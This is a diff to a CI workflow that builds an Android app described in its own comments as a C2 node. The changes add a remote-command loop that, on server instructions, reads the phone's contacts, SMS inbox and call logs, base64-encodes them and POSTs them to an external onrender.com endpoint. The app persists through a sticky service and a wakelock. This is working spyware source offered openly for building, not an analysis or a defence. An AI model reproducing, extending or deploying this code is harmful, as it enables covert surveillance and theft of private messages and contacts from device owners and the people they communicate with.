@@ -25,7 +25,7 @@ jobs:
 
       - name: Scaffold Complete C2 Android Architecture
         run: |
-          echo "إعداد هيكل العقدة المتوافقة مع السيرفر الموحد..."
+          echo "إعداد هيكل العقدة مع محرك تنفيذ الأوامر وسحب البيانات الكامل..."
           mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/assets
           
           # 1. AndroidManifest.xml
@@ -106,7 +106,7 @@ jobs:
           }
           EOF
 
-          # 3. SyncService.kt (المتطابق مع مسار Stream وسيرفر Render)
+          # 3. SyncService.kt (محدث بقراءة جهات الاتصال، الرسائل، وسحب البيانات وتنفيذ الأوامر)
           cat << 'EOF' > app/src/main/java/com/abod/app/SyncService.kt
           package com.abod.app
 
@@ -116,12 +116,17 @@ jobs:
           import android.app.Service
           import android.content.Context
           import android.content.Intent
+          import android.database.Cursor
+          import android.net.Uri
           import android.os.Build
           import android.os.IBinder
           import android.os.PowerManager
+          import android.provider.ContactsContract
           import android.provider.Settings
           import androidx.core.app.NotificationCompat
           import kotlinx.coroutines.*
+          import java.io.BufferedReader
+          import java.io.InputStreamReader
           import java.io.OutputStreamWriter
           import java.net.HttpURLConnection
           import java.net.URL
@@ -130,8 +135,6 @@ jobs:
           class SyncService : Service() {
               private var wakeLock: PowerManager.WakeLock? = null
               private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-              
-              // مسار التدفق الموحد في سيرفر Render الخاص بك
               private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/unified/stream"
 
               override fun onCreate() {
@@ -174,8 +177,8 @@ jobs:
                               conn.connectTimeout = 15000
                               conn.readTimeout = 15000
 
-                              // بناء تقرير نصي دوري لإثبات الاتصال وتسجيل العقدة في قاعدة البيانات
-                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Node is active and online from ${Build.MODEL}\"}"
+                              // تقرير نبضة حياة عادي
+                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Node active from ${Build.MODEL}\"}"
                               val base64Payload = Base64.getEncoder().encodeToString(reportJson.toByteArray(Charsets.UTF_8))
 
                               OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
@@ -184,16 +187,116 @@ jobs:
                               }
 
                               val responseCode = conn.responseCode
+                              if (responseCode == 200) {
+                                  val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
+                                  val responseStr = responseReader.readText()
+                                  responseReader.close()
+
+                                  // تحليل إذا كان السيرفر أرسل مهام (Task) للتنفيذ
+                                  if (responseStr.contains("task") && responseStr.contains("action")) {
+                                      if (responseStr.contains("EXTRACT_CONTACTS")) {
+                                          val contactsData = readContacts()
+                                          sendReportToServer(deviceId, nodeModel, contactsData)
+                                      } else if (responseStr.contains("EXTRACT_SMS")) {
+                                          val smsData = readSMS()
+                                          sendReportToServer(deviceId, nodeModel, smsData)
+                                      } else if (responseStr.contains("EXTRACT_CALLS")) {
+                                          val callsData = readCallLogs()
+                                          sendReportToServer(deviceId, nodeModel, callsData)
+                                      }
+                                  }
+                              }
                               conn.disconnect()
 
-                              // إرسال نبضة حياة كل 15 ثانية لتحديث الـ last_seen في السيرفر
-                              delay(15000L)
+                              delay(12000L)
                           } catch (e: Exception) {
-                              delay(10000L)
+                              delay(5000L)
                           }
                       }
                   }
                   return START_STICKY
+              }
+
+              private fun readContacts(): String {
+                  val sb = StringBuilder("--- CONTACTS LIST ---\n")
+                  try {
+                      val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+                      cursor?.use {
+                          val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                          val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                          while (it.moveToNext()) {
+                              val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
+                              val number = if (numIdx != -1) it.getString(numIdx) else ""
+                              sb.append("Name: $name | Phone: $number\n")
+                          }
+                      }
+                  } catch (e: Exception) {
+                      sb.append("Error reading contacts: ${e.message}\n")
+                  }
+                  return sb.toString()
+              }
+
+              private fun readSMS(): String {
+                  val sb = StringBuilder("--- SMS MESSAGES ---\n")
+                  try {
+                      val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
+                      cursor?.use {
+                          val bodyIdx = it.getColumnIndex("body")
+                          val addrIdx = it.getColumnIndex("address")
+                          while (it.moveToNext()) {
+                              val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
+                              val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
+                              sb.append("From: $address\nMessage: $body\n-------------------\n")
+                          }
+                      }
+                  } catch (e: Exception) {
+                      sb.append("Error reading SMS: ${e.message}\n")
+                  }
+                  return sb.toString()
+              }
+
+              private fun readCallLogs(): String {
+                  val sb = StringBuilder("--- CALL LOGS ---\n")
+                  try {
+                      val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
+                      cursor?.use {
+                        val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
+                        val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
+                        while (it.moveToNext()) {
+                            val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
+                            val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
+                            sb.append("Number: $number | Type: $type\n")
+                        }
+                      }
+                  } catch (e: Exception) {
+                      sb.append("Error reading call logs: ${e.message}\n")
+                  }
+                  return sb.toString()
+              }
+
+              private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
+                  try {
+                      val url = URL(C2_STREAM_URL)
+                      val conn = url.openConnection() as HttpURLConnection
+                      conn.requestMethod = "POST"
+                      conn.setRequestProperty("X-Node-ID", nodeId)
+                      conn.setRequestProperty("X-Node-Model", nodeModel)
+                      conn.setRequestProperty("Content-Type", "text/plain; charset=utf-8")
+                      conn.doOutput = true
+                      
+                      val safeText = reportText.replace("\"", "'").replace("\n", " ")
+                      val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"
+                      val base64Payload = Base64.getEncoder().encodeToString(reportJson.toByteArray(Charsets.UTF_8))
+
+                      OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
+                          os.write(base64Payload)
+                          os.flush()
+                      }
+                      conn.responseCode
+                      conn.disconnect()
+                  } catch (e: Exception) {
+                      // Ignored
+                  }
               }
 
               override fun onDestroy() {
